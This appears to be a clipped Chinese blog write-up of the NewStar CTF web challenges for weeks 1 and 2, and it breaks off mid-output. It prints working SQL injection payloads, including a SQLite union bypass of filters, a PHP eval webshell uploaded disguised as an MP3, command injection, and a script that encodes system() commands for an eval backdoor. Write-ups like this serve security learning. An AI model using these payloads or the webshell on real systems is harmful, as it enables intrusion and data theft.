---
title: "NewStar-web week1-2 - Rycarls little blog"
source: "https://blog.rycarl.cn/index.php/2025/10/15/newstar-web-week1-2/"
author:
  - "[[Rycarl]]"
published:
created: 2026-06-09
description: "WEEK1 multi-headach3 访问网站，看到robots字体加黑。联想到robots协议robots协议_百度百科访问robots.txt后得到hidden.php访问/hidden.php后什么都没有根据提示head尝试抓包 可以看到，页面中提示词HEAD，大概是指响应头,ct..."
tags:
  - "clippings"
---
---
title: "NewStar-web week1-2 - Rycarls little blog"
source: "https://blog.rycarl.cn/index.php/2025/10/15/newstar-web-week1-2/"
author: "[[Rycarl]]"
published: ""
created: "2026-06-09T21:08:39+08:00"
description: "WEEK1 multi-headach3 访问网站，看到robots字体加黑。联想到robots协议robots协议_百度百科访问robots.txt后得到hidden.php访问/hidden.php后什么都没有根据提示head尝试抓包 可以看到，页面中提示词HEAD，大概是指响应头,ct..."
tags: [clippings]
---

# NewStar-web week1-2 - Rycarls little blog

## NewStar-web week1-2

1,012次阅读

[

没有评论

](#comments)

共计 18911 个字符，预计需要花费 48 分钟才能阅读完成。

## WEEK1

## multi-headach3

访问网站，看到 **robots** 字体加黑。联想到 robots 协议 [robots 协议\_百度百科](https://baike.baidu.com/item/robots%E5%8D%8F%E8%AE%AE/2483797)  
![NewStar-web week1-2](https://blog.rycarl.cn/wp-content/uploads/2025/10/Pasted-image-20251014215132.png "NewStar-web week1-2")  
访问 robots.txt 后得到 hidden.php  
访问 /hidden.php 后什么都没有  
**根据提示 `head` 尝试抓包**

```bash
可以看到，页面中提示词 HEAD，大概是指响应头,ctf 中提示可能非常隐晦，一般都是提取关键字 / 词，提示的整个句子一般没有任何意义，比如这题说我头痛 这句整体没有任何意义，只有其中的 "HEAD" 词代表真正的提示，至于为什么一眼就可以知道 HEAD 是提示，只能说见得多了就记住了，有条件反射了
```
```
响应头是什么？在我们对一个页面进行访问时，实际是对 url 对应的目标发送请求(url 就是类似http://www.baidu.com 这样的链接)，而目标接收到请求之后会发送响应，而包含这种请求的整体叫请求包，包含响应的叫响应包，我们在浏览器中看到的所有内容基本都是 包含在响应包中，然后浏览器解析响应包，以显示我们所看到的内容，而我们使用一些工具就可以获取或拦截 请求包 和 响应包
```

  
得到 flag

## strange\_login

```sql
是一道 sql 注入题，要做这道题，首先要去学习相关的 sql 语句的语法，这题可能对于初学者来说挺困难的，尤其是去了解对应的原理，可能会花费好几天的时间。这里我先将对应的过程贴下，大家可以去搜索 sql 注入漏洞的利用什么是 sql，SQL（结构化查询语言）是一种用于管理和操作关系数据库的标准语言。它用于查询数据、更新记录、插入新数据和删除数据等操作。举个例子，我们常见的登录操作，就是通过 sql 语句的查询做到的，当一个 sql 语句查询账号和密码都为真返回了记录时你就通过了检测能够成功登录，从哪里查询呢，就是数据库里的字段信息。比如账户密码为admin/123456，当你输入时便会出现如下的句子，然而这样的句子是有漏洞的，因为没有过滤或者预编译，输入者可以通过闭合语句导致，比如输入引号或者逻辑判断符，就会导致 sql 语句被绕过，得到不该执行的查询返回，使得代码认为查询结果有记录，成功登录
```

根据题目提示猜测应该是考察 **SQL 注入**  
[SQL 注入深入基础以及进阶(未完成) – Rycarls little blog](https://rycarl.cn/index.php/2025/04/28/sql%e6%b3%a8%e5%85%a5%e6%b7%b1%e5%85%a5%e5%9f%ba%e7%a1%80%e4%bb%a5%e5%8f%8a%e8%bf%9b%e9%98%b6%e6%9c%aa%e5%ae%8c%e6%88%90/)  
  
下面提示以管理员身份登录，这里我们尝试用 admin 用户登录  
  
输入  
1’ 服务器报错  
  
**猜测是单引号注入**  
  
**这里 or ‘1’=’1 的作用使语句判断始终为真的同时可以闭合引号**  
成功得到 flag  
  
[SQL 注入 | 菜鸟教程](https://www.runoob.com/sql/sql-injection.html)

## 宇宙的中心是 php

```
这题主要考察 php 的相关知识，大家可以去稍微学一下 php，只求可以看懂，看不懂的用搜索引擎后就能看懂，实在不行就直接将 php 发给 chatgpt 进行解析
```

访问网站，发现 F12 无法打开  
直接用浏览器设置打开  
  
发现提示  
  
访问后得到代码

```php
<?php  

highlight_file(__FILE__);  

include "flag.php";  

if(isset($_POST['newstar2025'])){    $answer = $_POST['newstar2025'];  

    if(intval($answer)!=47&&intval($answer,0)==47){  

        echo $flag;  

    }else{  

        echo "你还未参透奥秘";  

    }  

}
```

**代码大致流程是：POST 传入 newstar2025 参数，要求 `intval()` 转换后不等于 47， `intval(..., 0)` 参数为 0 开头自动识别为八进制时，等于 47 这里我们用八进制传入参数 intval($answer,0), 自动识别为八进制绕过**  

## 我真得控制你了

```
本题也是考察 js 代码基础，可以问 chatgpt 如何解除按钮禁用
```

打开网页发现按钮被禁用  
  
**直接查看网页源代码手动发送数据包**  
  
可以看到这个按钮点击后会向 next-level.php 发送 access 和 csrf\_token  
这里我们手动发送数据包  
  
得到 weak\_password.php  
访问后是一个登录框  
  
都提示 weak\_password 了直接用弱口令爆破得到用户名 admin 密码 111111  
然后就是代码贴脸

```php
# 轻轻松松绕

 

真的很轻松

 

## 源码

 

<?php

error_reporting(0);

 

function generate_dynamic_flag($secret) {return getenv("ICQ_FLAG") ?: 'default_flag';

}

 

 

if (isset($_GET['newstar'])) {$input = $_GET['newstar'];

 

    if (is_array($input)) {die("恭喜掌握新姿势");

    }

 

 

    if (preg_match('/[^\d*\/~()\s]/', $input)) {die("老套路了，行不行啊");

    }

 

 

    if (preg_match('/^[\d\s]+$/', $input)) {die("请输入有效的表达式");

    }

 

    $test = 0;

    try {@eval("\$test = $input;");

    } catch (Error $e) {die("表达式错误");

    }

 

    if ($test == 2025) {$flag = generate_dynamic_flag($flag_secret);

        echo "<div class='success'> 拿下 flag！</div>";

        echo "<div class='flag-container'><div class='flag'>FLAG: {$flag}</div></div>";

    } else {echo "<div class='error'> 大哥哥泥把数字算错了: $test ≠ 2025</div>";}

} else {

    ?>

<?php } ?>
```

这里需要我们输入一个表达式，计算后值为 2025  
这里我们输入 newstar=5\*405 即可得到 flag  

## 别笑，你也过不了第二关

```
这题主要考察 js 的相关知识，大家可以去稍微学一下 html 和 js 相关的知识，不求写，只求看到时可以看懂，看不懂的用搜索引擎后就能看懂，实在不行就直接将 html 内容 发给 chatgpt 进行解析，让他翻译
```

打开是一个 html 前端小游戏，我们来审计 JS 代码  
来看看 AI 怎么说  
  
  
直接把请求发到 flag.php

!\[\[Pasted image 20251014224310.png\]\]  
得到 flag

又或者可以用 BP 或 yakit 手动发送数据包

```yaml
POST /flag.php HTTP/1.1

 

Host: eci-2ze376h8j2pkypwiudhz.cloudeci1.ichunqiu.com:80

 

Connection: keep-alive

 

Pragma: no-cache

 

Cache-Control: no-cache

 

sec-ch-ua: "Microsoft Edge";v="141", "Not?A_Brand";v="8", "Chromium";v="141"

 

sec-ch-ua-mobile: ?0

 

sec-ch-ua-platform: "Windows"

 

Upgrade-Insecure-Requests: 1

 

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0

 

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

 

Sec-Fetch-Site: same-site

 

Sec-Fetch-Mode: navigate

 

Sec-Fetch-User: ?1

 

Sec-Fetch-Dest: document

 

Referer: https://match.ichunqiu.com/

 

Accept-Encoding: gzip, deflate, br, zstd

 

Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6

 

Content-Type: application/x-www-form-urlencoded

 

 

 

score=100000000000
```

!\[\[Pasted image 20251015161543.png\]\]

## 黑客小 W 的故事（1）

进来先是杀吉欧，点一次杀一个。  
!\[\[Pasted image 20251015155518.png\]\]  
我们抓个包试试  
!\[\[Pasted image 20251015155522.png\]\]  
可以看到下面有个 count，我们猜测 count 指的是吉欧的数量。  
修改 count 为 100 试试  
得到响应

```makefile
HTTP/1.1 200 OK

 

Date: Wed, 15 Oct 2025 07:56:15 GMT

 

Content-Type: application/json

 

Connection: keep-alive

 

Set-Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJOYW1lIjoiVHJ1ZSIsImxldmVsIjoyfQ.ME4ADrIfTbh2vg9tWfyjHaf9K8ZD2JDWh_rH1U8teIc; Path=/

 

Content-Length: 29

 

 

 

{"NextLevel":"/Level2_mato"}
```

我们编辑一下 cookie 然后访问 Level2  
!\[\[Pasted image 20251015155811.png\]\]  
说一些听不懂的玩意，我们看看提示!\[\[Pasted image 20251015155830.png\]\]  
使用 get 传入参数  
!\[\[Pasted image 20251015155905.png\]\]  
现在就看的懂了  
!\[\[Pasted image 20251015155926.png\]\]  
提示用 POST 告诉他，这里我们用 POST 传入 guding  
!\[\[Pasted image 20251015160206.png\]\]  
然后提示我们用 DELETE 方法弄掉虫子  
发送数据包

```makefile
DELETE /talkToMushroom?shipin=mogubaozi HTTP/1.1

 

Host: eci-2ze2pb4mhd1oeygm8fhi.cloudeci1.ichunqiu.com:8000

 

Connection: keep-alive

 

Content-Length: 0

 

Cache-Control: max-age=0

 

sec-ch-ua: "Microsoft Edge";v="141", "Not?A_Brand";v="8", "Chromium";v="141"

 

sec-ch-ua-mobile: ?0

 

sec-ch-ua-platform: "Windows"

 

Origin: https://eci-2ze2pb4mhd1oeygm8fhi.cloudeci1.ichunqiu.com:8000

 

Content-Type: application/x-www-form-urlencoded

 

Upgrade-Insecure-Requests: 1

 

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0

 

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

 

Sec-Fetch-Site: none

 

Sec-Fetch-Mode: navigate

 

Sec-Fetch-Dest: document

 

Referer: https://eci-2ze2pb4mhd1oeygm8fhi.cloudeci1.ichunqiu.com:8000/talkToMushroom?shipin=mogubaozi

 

Accept-Encoding: gzip, deflate, br, zstd

 

Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6

 

Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJOYW1lIjoiVHJ1ZSIsImxldmVsIjoyfQ.ME4ADrIfTbh2vg9tWfyjHaf9K8ZD2JDWh_rH1U8teIc

 

sec-fetch-user: ?1

 

 

 

chongzi
```

然后问我们想要什么回报  
!\[\[Pasted image 20251015160317.png\]\]  
我们再提起 guding 试试  
!\[\[Pasted image 20251015160344.png\]\]

给了我们另一个路由  
访问后让我们使用技能  
!\[\[Pasted image 20251015160455.png\]\]  
提示给出让我们看看 user-agent  
!\[\[Pasted image 20251015160520.png\]\]  
那我们就把 ctcloneslash 写入 ua 中试试

*注意：user-agent 修改后仍要符合格式*

这里我们修改 ua

```makefile
GET /Level3_SheoChallenge HTTP/1.1

 

Host: eci-2ze2pb4mhd1oeygm8fhi.cloudeci1.ichunqiu.com:8000

 

Connection: keep-alive

 

sec-ch-ua: "Microsoft Edge";v="141", "Not?A_Brand";v="8", "Chromium";v="141"

 

sec-ch-ua-mobile: ?0

 

sec-ch-ua-platform: "Windows"

 

Upgrade-Insecure-Requests: 1

 

User-Agent: CycloneSlash/537.36 Edg/141.0.0.0

 

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

 

Sec-Fetch-Site: same-origin

 

Sec-Fetch-Mode: navigate

 

Sec-Fetch-Dest: document

 

Accept-Encoding: gzip, deflate, br, zstd

 

Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6

 

Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJOYW1lIjoiVHJ1ZSIsImxldmVsIjozfQ.MbBI6-JF2xO-qHkvUmQpksFt3Z8zfpkiRn9ClWCPX80

 

referer: https://eci-2ze2pb4mhd1oeygm8fhi.cloudeci1.ichunqiu.com:8000/hint_DingziHelpsYou
```

然后问我们 dashslash  
!\[\[Pasted image 20251015160756.png\]\]  
继续修改 UA

```makefile
GET /Level3_SheoChallenge HTTP/1.1

 

Host: eci-2ze2pb4mhd1oeygm8fhi.cloudeci1.ichunqiu.com:8000

 

Connection: keep-alive

 

sec-ch-ua: "Microsoft Edge";v="141", "Not?A_Brand";v="8", "Chromium";v="141"

 

sec-ch-ua-mobile: ?0

 

sec-ch-ua-platform: "Windows"

 

Upgrade-Insecure-Requests: 1

 

User-Agent: CycloneSlash/537.36 DashSlash/141.0.0.0

 

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

 

Sec-Fetch-Site: same-origin

 

Sec-Fetch-Mode: navigate

 

Sec-Fetch-Dest: document

 

Accept-Encoding: gzip, deflate, br, zstd

 

Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6

 

Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJOYW1lIjoiVHJ1ZSIsImxldmVsIjozfQ.MbBI6-JF2xO-qHkvUmQpksFt3Z8zfpkiRn9ClWCPX80

 

referer: https://eci-2ze2pb4mhd1oeygm8fhi.cloudeci1.ichunqiu.com:8000/hint_DingziHelpsYou
```

!\[\[Pasted image 20251015160840.png\]\]

访问第四个路由得到 flag  
!\[\[Pasted image 20251015160903.png\]\]

## WEEK2

## DD 加速器

```lua
这题考察的是通用漏洞 -- 命令注入的了解，细节可以看下面两个 URL
```

打开发现是一个测速网站  
!\[\[Pasted image 20251015162147.png\]\]  
看到下面有个提示本结果是系统命令产生  
那不难想到 **命令注入漏洞**  
**[RCE 漏洞基础以及绕过 – Rycarls little blog](https://rycarl.cn/index.php/2025/03/17/61/) [命令注入（Command Injection) | Vulnerability-wiki](https://www.vul-wiki.org/vulnerability/web/inject.html)**  
查看根目录后发现没有 flag  
!\[\[Pasted image 20251015162418.png\]\]  
那我们就看看环境变量  
*在 Linux 系统中输入 env 即可查看环境变量*  
!\[\[Pasted image 20251015162520.png\]\]  
成功找到 FLAG

## 搞点哦润吉吃吃橘

进去后查看网页源代码可以看到备份的账号密码  
!\[\[Pasted image 20251015162655.png\]\]  
!\[\[Pasted image 20251015162718.png\]\]  
登陆后让我们计算表达式就可以

方法一：  
如果你手速快可以写个脚本计算后复制粘贴

```python
import re  

 

 

def calculate_expression(expression):  

    """  

    计算形如 (a * b) ^ c 的表达式。支持十进制和十六进制（以 0x 开头）数字。"""    # 移除所有空格，简化处理  

    expression = expression.replace('','')  

 

    # 使用正则表达式匹配模式: (数字 * 数字) ^ 数字  

    # 这个模式能匹配十进制和十六进制数  

    pattern = r'\((\d+|\+?\d+|0x[a-fA-F0-9]+)\*(\d+|\+?\d+|0x[a-fA-F0-9]+)\)\^(\d+|\+?\d+|0x[a-fA-F0-9]+)'  

    match = re.fullmatch(pattern, expression)  

 

    if not match:  

        raise ValueError(f"表达式格式错误。请使用格式: (数字 * 数字) ^ 数字。例如: (1760516944 * 46965) ^ 0xafb217")  

 

    # 提取匹配的数字（可能是十进制或十六进制字符串）num1_str, num2_str, num3_str = match.groups()  

 

    try:  

        # 将字符串转换为整数，int() 函数能自动识别 0x 开头的十六进制  

        num1 = int(num1_str)  

        num2 = int(num2_str)  

        num3 = int(num3_str)  

    except ValueError as e:  

        raise ValueError(f"数字格式错误，请检查输入的数值: {e}")  

 

    # 执行计算：先乘法，后异或  

    multiplication_result = num1 * num2  

    result = multiplication_result ^ num3  

 

    return multiplication_result, result  

 

 

def main():  

    print("=== 实时表达式计算器 ===")  

    print("支持格式: (数字 * 数字) ^ 数字")  

    print("支持十进制和十六进制数（十六进制以 0x 开头）")  

    print("输入'quit'或'exit'退出程序")  

    print("-" * 50)  

 

    while True:  

        try:  

            # 获取用户输入  

            user_input = input("\n 请输入表达式:").strip()  

 

            # 检查退出命令  

            if user_input.lower() in ['quit', 'exit']:  

                print("再见！")  

                break  

 

            # 跳过空输入  

            if not user_input:  

                print("输入不能为空，请重新输入。")  

                continue  

 

            # 计算表达式  

            mult_result, final_result = calculate_expression(user_input)  

 

            # 输出结果  

            print(f"表达式: {user_input}")  

            print(f"乘法结果: {mult_result}")  

            print(f"最终结果 (token): {final_result}")  

            print(f"十六进制表示: {hex(final_result)}")  

 

        except ValueError as e:  

            print(f"输入错误: {e}")  

        except Exception as e:  

            print(f"发生未知错误: {e}")  

 

 

# 运行程序  

if __name__ == "__main__":  

    main()
```

我手速不快就不演示了（

方法二：写一个脚本自动获取表达式然后计算发送数据包

```python
import requests  

import re  

 

# ================== 配置 ==================BASE_URL = "https://eci-2zej1duwdropgobmr8vp.cloudeci1.ichunqiu.com:5000"  

 

# 🔑 第一个 Cookie：登录后的 session（需要手动提供）LOGIN_SESSION = "eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiRG9ybyJ9.aOhuBw.4B02GfafrkYSiFe94OYbBnfj8-I"  # 替换为你自己的 cookie  

 

HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",  

    "Content-Type": "application/json",  

    "Accept": "*/*",  

    "Origin": BASE_URL,  

    "Referer": f"{BASE_URL}/home",  

    "Accept-Language": "zh-CN,zh;q=0.9",  

}  

# ==========================================  

 

# 创建会话  

session = requests.Session()  

session.headers.update(HEADERS)  

 

try:  

    # Step 1: 彻底清空旧 Cookie，避免冲突  

    print("[*] 清空旧 Cookie...")  

    session.cookies.clear()  

 

    # 设置登录态 Cookie，并指定 domain 和 path    print("[*] 设置登录 Cookie...")  

    session.cookies.set(  

        'session',  

        LOGIN_SESSION,  

        domain="eci-2zej1duwdropgobmr8vp.cloudeci1.ichunqiu.com",  

        path="/"  

    )  

 

    # Step 2: 请求挑战  

    print("[*] 请求 /start_challenge...")  

    start_resp = session.post(f"{BASE_URL}/start_challenge", json={})  

 

    if start_resp.status_code != 200:  

        raise Exception(f"请求失败: {start_resp.status_code}, {start_resp.text}")  

 

    data = start_resp.json()  

    print(f"[*] 获取表达式: {data['expression']}")  

 

    # 检查 Cookie 是否更新  

    new_session = session.cookies.get('session')  

    if new_session and new_session != LOGIN_SESSION:  

        print(f"✅ Cookie 已更新为挑战态: {new_session[:50]}...")  

    else:  

        print("⚠️  Cookie 未更新，可能影响提交！")  

 

    # Step 3: 计算 token    big_num = int(re.search(r'token\s*=\s*\((\d+)\s*\*\s*\d+', data['expression']).group(1))  

    multiplier = data['multiplier']  

    xor_val = int(data['xor_value'], 16)  

    token = (big_num * multiplier) ^ xor_val  

    print(f"[*] 计算 token: {token}")  

 

    # Step 4: 提交 token    print("[*] 提交 /verify_token...")  

    verify_resp = session.post(f"{BASE_URL}/verify_token",  

        json={"token": token}  

    )  

 

    try:  

        result = verify_resp.json()  

        print(f"🎉 结果: {result}")  

        if 'flag' in str(result).lower():  

            print(f"✅ 拿到 FLAG! {result}")  

    except:  

        print(f"🚨 非 JSON 响应: {verify_resp.text}")  

 

except Exception as e:  

    print(f"[X] 错误: {e}")
```

注意需要修改 cookie 和 host 还有下面的 domain  
可以直接得到 flag  
!\[\[Pasted image 20251015164744.png\]\]

## 白帽小 K 的故事（1）

```makefile
这里考察的是文件上传和文件包含漏洞，虽然没有直接写明那个地方有 include()

但是我们要有根据路由的名字推断这个路由的功能和后端代码的能力
```

[一文详解文件包含漏洞 – FreeBuf 网络安全行业门户](https://www.freebuf.com/articles/web/367359.html)

点开是一个上传文件和播放的系统  
!\[\[Pasted image 20251015165714.png\]\]  
按 F12 发现一个废弃的接口，貌似可以加载文件。这里我们上传一个一句话木马

!\[\[Pasted image 20251015165743.png\]\]

```makefile
POST /v1/upload HTTP/1.1

 

Host: eci-2zeg93f0m7xvsmp0guiz.cloudeci1.ichunqiu.com:80

 

Connection: keep-alive

 

Content-Length: 209

 

sec-ch-ua-platform: "Windows"

 

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0

 

sec-ch-ua: "Microsoft Edge";v="141", "Not?A_Brand";v="8", "Chromium";v="141"

 

Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCyq8wNAhZgno43BP

 

sec-ch-ua-mobile: ?0

 

Accept: */*

 

Origin: https://eci-2zeg93f0m7xvsmp0guiz.cloudeci1.ichunqiu.com:80

 

Sec-Fetch-Site: same-origin

 

Sec-Fetch-Mode: cors

 

Sec-Fetch-Dest: empty

 

Referer: https://eci-2zeg93f0m7xvsmp0guiz.cloudeci1.ichunqiu.com:80/music

 

Accept-Encoding: gzip, deflate, br, zstd

 

Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6

 

 

 

------WebKitFormBoundaryCyq8wNAhZgno43BP

 

Content-Disposition: form-data; name="file"; filename="1.MP3"

 

Content-Type: audio/mpeg

 

 

 

<?php @eval($_POST['123']); ?>

 

------WebKitFormBoundaryCyq8wNAhZgno43BP--
```

然后访问这个借口加载木马得到 flag  
!\[\[Pasted image 20251015170134.png\]\]

## 真的是签到诶

```
就简单的考察代码功底和编写代码的能力
```

上来就是代码贴脸

```xml
<?php  

highlight_file(__FILE__);  

 

$cipher&nbsp;=&nbsp;$_POST['cipher']&nbsp;??&nbsp;'';  

 

function&nbsp;atbash($text)&nbsp;{&nbsp;&nbsp;$result&nbsp;=&nbsp;'';  

&nbsp;&nbsp;foreach&nbsp;(str_split($text)&nbsp;as&nbsp;$char)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(ctype_alpha($char))&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$is_upper&nbsp;=&nbsp;ctype_upper($char);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$base&nbsp;=&nbsp;$is_upper&nbsp;?&nbsp;ord('A')&nbsp;:&nbsp;ord('a');&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$offset&nbsp;=&nbsp;ord(strtolower($char))&nbsp;-&nbsp;ord('a');&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$new_char&nbsp;=&nbsp;chr($base&nbsp;+&nbsp;(25&nbsp;-&nbsp;$offset));&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$result&nbsp;.=&nbsp;$new_char;  

&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$result&nbsp;.=&nbsp;$char;  

&nbsp;&nbsp;&nbsp;&nbsp;}  

&nbsp;&nbsp;}  

&nbsp;&nbsp;return&nbsp;$result;  

}  

 

if&nbsp;($cipher)&nbsp;{&nbsp;&nbsp;$cipher&nbsp;=&nbsp;base64_decode($cipher);&nbsp;&nbsp;$encoded&nbsp;=&nbsp;atbash($cipher);&nbsp;&nbsp;$encoded&nbsp;=&nbsp;str_replace('&nbsp;',&nbsp;'',&nbsp;$encoded);&nbsp;&nbsp;$encoded&nbsp;=&nbsp;str_rot13($encoded);  

&nbsp;&nbsp;@eval($encoded);  

&nbsp;&nbsp;exit;  

}  

 

$question&nbsp;=&nbsp;"真的是签到吗？";  

$answer&nbsp;=&nbsp;"真的很签到诶！";  

 

$res&nbsp;=&nbsp;&nbsp;$question&nbsp;.&nbsp;"<br>"&nbsp;.&nbsp;$answer&nbsp;.&nbsp;"<br>";  

echo&nbsp;$res&nbsp;.&nbsp;$res&nbsp;.&nbsp;$res&nbsp;.&nbsp;$res&nbsp;.&nbsp;$res;  

 

?>
```

我们来看看代码执行流程

1. **获取输入** ：从 `POST` 请求中获取名为 `cipher` 的参数。如果该参数不存在，则为空字符串。
2. **解密与执行流程** （当 `cipher` 不为空时）：
	- **Base64 解码** ：将 `cipher` 的值进行 Base64 解码。
		- **Atbash 变换** ：对解码后的字符串进行 Atbash 变换。这是一种简单的字母替换密码，将字母表倒序映射（A<->Z, B<->Y, C<->X, …）。
		- **去除空格** ：移除字符串中的所有空格。
		- **ROT13 变换** ：对处理后的字符串进行 ROT13 变换（将字母表中的每个字母向前移动 13 位）。
		- **执行代码** ：使用 `eval()` 函数执行最终得到的字符串。这是一个非常危险的操作，因为它会将字符串作为 PHP 代码执行。
		- **退出** ：执行完 `eval` 后，脚本退出。  
		知道了加密流程接下来就该写解密脚本了
```python
#!/usr/bin/env python3  

# -*- coding: utf-8 -*-  

 

import base64  

import sys  

 

 

def atbash(text):  

    """Atbash 密码实现：A->Z, B->Y, ..., a->z, b->y, etc."""  

    result = []  

    for char in text:  

        if 'a' <= char <= 'z':  

            result.append(chr(ord('z') - (ord(char) - ord('a'))))  

        elif 'A' <= char <= 'Z':  

            result.append(chr(ord('Z') - (ord(char) - ord('A'))))  

        else:  

            result.append(char)  

    return ''.join(result)  

 

 

def rot13(text):  

    """ROT13 编码实现"""  

    result = []  

    for char in text:  

        if 'a' <= char <= 'z':  

            if char <= 'm':  

                result.append(chr(ord(char) + 13))  

            else:  

                result.append(chr(ord(char) - 13))  

        elif 'A' <= char <= 'Z':  

            if char <= 'M':  

                result.append(chr(ord(char) + 13))  

            else:  

                result.append(chr(ord(char) - 13))  

        else:  

            result.append(char)  

    return ''.join(result)  

 

 

def encode_command(command):  

    """  

    将 PHP 命令编码为符合要求的格式  

    处理流程: command -> ROT13 -> Atbash -> base64  

    """    # 使用制表符代替空格，因为空格会被移除  

    command = command.replace('','\t')  

 

    # 应用 ROT13  

    rot13_encoded = rot13(command)  

 

    # 应用 Atbash  

    atbash_encoded = atbash(rot13_encoded)  

 

    # Base64 编码  

    base64_encoded = base64.b64encode(atbash_encoded.encode()).decode()  

 

    return base64_encoded  

 

 

def main():  

    if len(sys.argv) < 2:  

        print("用法: python encode_command.py' 要执行的 PHP 命令 '")  

        print("示例: python encode_command.py \"system('ls /');\"")  

        sys.exit(1)  

 

    command = sys.argv[1]  

    encoded = encode_command(command)  

 

    print(f"原始命令: {command}")  

    print(f"编码结果: {encoded}")  

    print("\n 使用方式:")  

    print(f"curl -X POST -d \"cipher={encoded}\"https://eci-2zefcob15uo9dopmpx8u.cloudeci1.ichunqiu.com:80/")  

 

 

if __name__ == "__main__":  

    main()
```

然后 POST 传入参数即可  
!\[\[Pasted image 20251015170651.png\]\]

## 小 E 的管理系统

点开后是一个服务器状态查询  
!\[\[Pasted image 20251015172656.png\]\]  
我们随便查询一个看看，发现参数 id 接下来就是慢慢注入测试了  
!\[\[Pasted image 20251015173015.png\]\]  
测试后发现过滤了空格，由于有回显，这里我们优先考虑联合注入  
[SQL 注入基础及绕过手段 – Rycarls little blog](https://rycarl.cn/index.php/2025/03/17/sql%e6%b3%a8%e5%85%a5%e5%9f%ba%e7%a1%80%e8%bf%9b%e9%98%b6%e4%bb%a5%e5%8f%8a%e7%bb%95%e8%bf%87%e6%89%8b%e6%ae%b5/)

由于过滤了空格我们可以用其他空白字符代替如 %09（tab 的 url 编码）  
发现还过滤了逗号，那么一般的联合注入就不行了。  
搜寻一番后找到了代替 – 用 join 函数代替逗号 (这里是 sqlite 数据库而不是 mysql)  
payload:  
`1%09union%09select%09*%09from%09(select%091)%09a%09join%09(select%092)%09b%09join%09(select%093)%09c%09join%09(SELECT%09name%09FROM%09sqlite_master)%09d%09join%09(select%09SELECT%09sql%09FROM%09sqlite_master)%09f`  
!\[\[Pasted image 20251015173614.png\]\]  
得到了表名，我们发现 sys\_config 那个比较可疑

```swift
[

  {

    "id": 1,

    "cpu": 2,

    "ram": 3,

    "status": "node_status",

    "lastChecked": null

  },

  {

    "id": 1,

    "cpu": 2,

    "ram": 3,

    "status": "node_status",

    "lastChecked": "CREATE TABLE node_status (\n    node_id INTEGER PRIMARY KEY,\n    cpu_usage VARCHAR(10),\n    ram_usage VARCHAR(10),\n    status VARCHAR(15) CHECK(status IN ('Online','Offline','Maintenance')),\n    last_checked DATETIME DEFAULT CURRENT_TIMESTAMP\n)"

  },

  {

    "id": 1,

    "cpu": 2,

    "ram": 3,

    "status": "node_status",

    "lastChecked": "CREATE TABLE sqlite_sequence(name,seq)"

  },

  {

    "id": 1,

    "cpu": 2,

    "ram": 3,

    "status": "node_status",

    "lastChecked": "CREATE TABLE sys_config (\n    id INTEGER PRIMARY KEY AUTOINCREMENT,\n    config_key VARCHAR(50) UNIQUE,\n    config_value TEXT\n)"

  },

  {

    "id": 1,

    "cpu": 2,

    "ram": 3,

    "status": "sqlite_autoindex_sys_config_1",

    "lastChecked": null

  },

  {

    "id": 1,

    "cpu": 2,

    "ram": 3,

    "status": "sqlite_autoindex_sys_config_1",

    "lastChecked": "CREATE TABLE node_status (\n    node_id INTEGER PRIMARY KEY,\n    cpu_usage VARCHAR(10),\n    ram_usage VARCHAR(10),\n    status VARCHAR(15) CHECK(status IN ('Online','Offline','Maintenance')),\n    last_checked DATETIME DEFAULT CURRENT_TIMESTAMP\n)"

  },

  {

    "id": 1,

    "cpu": 2,

    "ram": 3,

    "status": "sqlite_autoindex_sys_config_1",

    "lastChecked": "CREATE TABLE sqlite_sequence(name,seq)"

  },

  {

    "id": 1,

    "cpu": 2,

    "ram": 3,

    "status": "sqlite_autoindex_sys_config_1",

    "lastChecked": "CREATE TABLE sys_config (\n    id INTEGER PRIMARY KEY AUTOINCREMENT,\n    config_key VARCHAR(50) UNIQUE,\n    config_value TEXT\n)"

  },

  {

    "id": 1,

